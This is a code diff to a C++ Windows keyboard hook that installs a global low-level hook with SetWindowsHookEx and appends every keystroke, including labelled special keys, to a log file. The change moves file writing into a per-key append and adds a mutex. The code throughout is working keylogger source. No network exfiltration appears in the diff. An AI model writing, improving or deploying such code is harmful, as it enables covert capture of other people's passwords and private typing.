@@ -1,14 +1,16 @@
 #include "KeyboardHook.h"
 
-std::ofstream logFile;
+std::string logFile;
 
 HHOOK _hook;
 
 KBDLLHOOKSTRUCT kbdStruct;
 
+std::mutex mtx;
+
 void SetHook(std::string file){
-    
-    logFile.open(file);
+
+	logFile = file;
 
 	_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
 
@@ -17,6 +19,8 @@ void SetHook(std::string file){
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 	// ALT GR e ALT devolvem wParam == 260 em vez de 256 (WM_KEYDOWN)
+
+	mtx.lock();
 
 	if (nCode >= 0){
 
@@ -30,58 +34,63 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) {
 
 	}
 
+	mtx.unlock();
 	return CallNextHookEx(_hook, nCode, wParam, lParam);
 }
 
 void WriteKey(int key) {
 
+	std::ofstream file;
+	file.open(logFile, std::ofstream::app);
+
 	switch (key) {
 	case 160:
-		logFile << "[SHIFT]";
+		file << "[SHIFT]";
 		break;
 	case VK_CAPITAL:
-		logFile << "[CAPS]";
+		file << "[CAPS]";
 		break;
 	case VK_MENU:
-		logFile << "[ALT]";
+		file << "[ALT]";
 		break;
 	case VK_BACK:
-		logFile << "[BACKSPACE]";
+		file << "[BACKSPACE]";
 		break;
 	case VK_TAB:
-		logFile << "[TAB]";
+		file << "[TAB]";
 		break;
 	case VK_RETURN:
-		logFile << "[ENTER]";
+		file << "[ENTER]";
 		break;
 	case VK_SPACE:
-		logFile << "[SPACE]";
+		file << "[SPACE]";
 		break;
 	case 130:
-		logFile << "�";
+		file << "�";
 		break;
 	case VK_DELETE:
-		logFile << "[DELETE]";
+		file << "[DELETE]";
 		break;
 	case 190:
-		logFile << "[. or :]";
+		file << "[. or :]";
 		break;
 	case 188:
-		logFile << "[, or ;]";
+		file << "[, or ;]";
 		break;
 	case 187:
-		logFile << "[+ or *]";
+		file << "[+ or *]";
 		break;
 	case 191:
-		logFile << "[~ or ^]";
+		file << "[~ or ^]";
 		break;
 	case 189:
-		logFile << "[- or _]";
+		file << "[- or _]";
 		break;
 	case 164:
 		break;
 	default:
-		logFile << (char)key;
+		file << (char)key;
 	}
-	logFile.flush();
+	file.flush();
+	file.close();
 }
